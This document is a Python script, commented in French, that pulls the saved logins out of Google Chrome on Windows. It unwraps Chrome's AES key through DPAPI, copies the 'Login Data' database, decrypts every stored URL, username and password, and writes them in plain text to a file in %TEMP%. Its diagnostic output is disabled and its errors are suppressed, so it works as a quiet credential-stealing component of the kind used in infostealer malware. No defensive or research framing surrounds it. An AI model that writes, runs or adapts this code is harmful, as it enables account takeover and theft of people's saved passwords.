# decryptor.py
import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt # Requires pywin32 -> pip install pywin32
from Crypto.Cipher import AES # Requires PyCryptodome -> pip install pycryptodome

# --- Configuration ---
OUTPUT_FILENAME = "decrypted_credentials.txt"
# --- Fin Configuration ---

def get_chrome_datetime(chromedate):
    """Convertit le format de date Chrome en objet datetime Python"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            # print(f"Error converting date: {e}") # Debug
            return datetime(1601, 1, 1)
    return "" # Retourne une chaîne vide ou None si la date est invalide/par défaut


def get_encryption_key():
    """Récupère la clé de chiffrement AES depuis le fichier Local State"""
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    if not os.path.exists(local_state_path):
        # print("Error: Local State file not found.") # Debug
        return None

    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
    except Exception as e:
        # print(f"Error reading Local State: {e}") # Debug
        return None

    try:
        # Clé encodée en Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Supprimer le préfixe DPAPI
        key = key[5:]
        # Utiliser DPAPI pour déchiffrer la clé AES
        # Le second argument (None) est pour les données d'entropie optionnelles
        # Le troisième (None) est pour les données de description
        # Le quatrième (None) est pour les flags (0 par défaut)
        # Le dernier (0) est pour les flags crypt protect prompt
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return key
    except Exception as e:
        # print(f"Error decrypting key: {e}") # Debug
        return None

def decrypt_password(password, key):
    """Déchiffre un mot de passe Chrome (AES-GCM)"""
    try:
        # Récupérer le vecteur d'initialisation (IV) / nonce
        iv = password[3:15]
        # Récupérer le mot de passe chiffré (payload)
        password = password[15:]
        # Initialiser le déchiffreur AES GCM
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # Déchiffrer le mot de passe
        return cipher.decrypt(password)[:-16].decode() # Retirer le tag d'authentification (16 derniers octets)
    except Exception as e:
        # print(f"Error decrypting password chunk: {e}") # Debug
        # Essayer l'ancienne méthode DPAPI directe (moins probable pour les mdp récents)
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except Exception as e:
            # print(f"Error decrypting password (legacy DPAPI): {e}") # Debug
            return "DECRYPTION_ERROR"


def main():
    key = get_encryption_key()
    if not key:
        # print("Failed to get encryption key. Exiting.") # Debug
        return # Impossible de continuer sans la clé

    db_path_original = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "Default", "Login Data")
    # Chemin temporaire pour copier la base de données (évite les locks)
    temp_db_path = os.path.join(os.environ["TEMP"], "login_db_copy.sqlite")

    if not os.path.exists(db_path_original):
        # print(f"Login Data file not found at {db_path_original}") # Debug
        return

    try:
        shutil.copyfile(db_path_original, temp_db_path) # Copier avant d'ouvrir
        # print(f"Copied Login Data to {temp_db_path}") # Debug
    except Exception as e:
        # print(f"Error copying Login Data: {e}") # Debug
        return


    results = [] # Pour stocker les identifiants déchiffrés

    try:
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")

        # print("Reading logins database...") # Debug
        for row in cursor.fetchall():
            origin_url = row[0]
            # action_url = row[1] # Moins utile généralement
            username = row[2]
            encrypted_password = row[3]
            # date_created = get_chrome_datetime(row[4]) # Optionnel
            # date_last_used = get_chrome_datetime(row[5]) # Optionnel

            if username or encrypted_password:
                decrypted_password = decrypt_password(encrypted_password, key)
                if decrypted_password and decrypted_password != "DECRYPTION_ERROR":
                    results.append(f"URL: {origin_url}\nUser: {username}\nPass: {decrypted_password}\n{'-'*20}")
                    # print(f"Decrypted: {origin_url} | {username} | {decrypted_password[:10]}...") # Debug partiel
            else:
                continue # Entrée vide

        cursor.close()
        conn.close()
        # print("Finished reading database.") # Debug

    except sqlite3.Error as e:
        # print(f"SQLite Error: {e}") # Debug
        results.append(f"SQLite Error: {e}")
    except Exception as e:
        # print(f"General Error during DB processing: {e}") # Debug
        results.append(f"General Error: {e}")


    # Écrire les résultats dans le fichier de sortie dans %TEMP%
    output_path = os.path.join(os.environ["TEMP"], OUTPUT_FILENAME)
    try:
        with open(output_path, "w", encoding="utf-8") as f:
            f.write("\n".join(results))
        # print(f"Results written to {output_path}") # Debug
    except Exception as e:
        # print(f"Error writing output file: {e}") # Debug
        pass # Échoue silencieusement si l'écriture échoue

    # Nettoyer la copie temporaire de la base de données
    try:
        os.remove(temp_db_path)
        # print(f"Removed temporary db copy: {temp_db_path}") # Debug
    except Exception as e:
        # print(f"Error removing temporary db copy: {e}") # Debug
        pass    

if __name__ == "__main__":
    main()